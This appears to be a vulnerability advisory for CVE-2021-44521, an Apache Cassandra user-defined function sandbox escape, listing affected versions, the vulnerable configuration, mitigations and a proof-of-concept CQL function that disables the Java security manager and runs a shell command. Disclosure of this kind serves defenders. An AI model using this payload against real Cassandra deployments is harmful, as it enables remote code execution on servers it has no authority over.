---
description: CVE-2021-44521 High severity. Insufficient sandboxing of user-defined functions in Apache Cassandra leads to remote code execution
title: Cassandra UDF RCE
date_published: "2022-02-15"
last_updated: "2022-02-15"
xray_id: XRAY-197962
vul_id: CVE-2021-44521
cvss: 8.4
severity: high
discovered_by: Omer Kaspi
type: vulnerability
---
## Summary
Insufficient sandboxing of user-defined functions in Apache Cassandra leads to remote code execution

## Component

[Apache Cassandra](https://cassandra.apache.org/_/index.html)

## Affected versions

[3.0.0-alpha1, 3.0.25], fixed in 3.0.26

[3.1, 3.11.11], fixed in 3.11.12

[4.0-alpha1, 4.0.1], fixed in 4.0.2

## Description

CVE-2021-44521 is an RCE (remote code execution) issue in Apache Cassandra. This Apache vulnerability is easy to exploit and has the potential to wreak havoc on systems, but luckily only manifests in non-default configurations of Cassandra.  

Cassandra deployments are vulnerable to CVE-2021-44521 when the cassandra.yaml configuration file contains the following definitions:

```
enable_user_defined_functions: true
enable_scripted_user_defined_functions: true
enable_user_defined_functions_threads: false
```
A malicious authenticated user can run a trivial (publicly available) SQL query that causes remote code execution, by running JavaScript code in the query that abuses the JavaScript engine (Nashorn) and escapes the security sandbox

## PoC

```
create or replace function x.escape_system(name text) RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE javascript AS $$
var System = Java.type("java.lang.System");System.setSecurityManager(null);this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec("touch hacked")');name $$;
```



## Vulnerability Mitigations

1. If UDFs are not actively used, they can be completely disabled by setting `enable_user_defined_functions` to `false` (which is the default value)
2. If UDFs are needed, set `enable_user_defined_functions_threads` to `true` (which is the default value)
3. Remove the permissions of creating, altering and executing functions for untrusted users by removing the following permissions: `ALL FUNCTIONS`, `ALL FUNCTIONS IN KEYSPACE` and `FUNCTION` for `CREATE`, `ALTER` and `EXECUTE` queries ([see blog post for example query](https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/))

## References

[(JFrog) CVE-2021-44521: RCE Vulnerability in Apache Cassandra](https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/)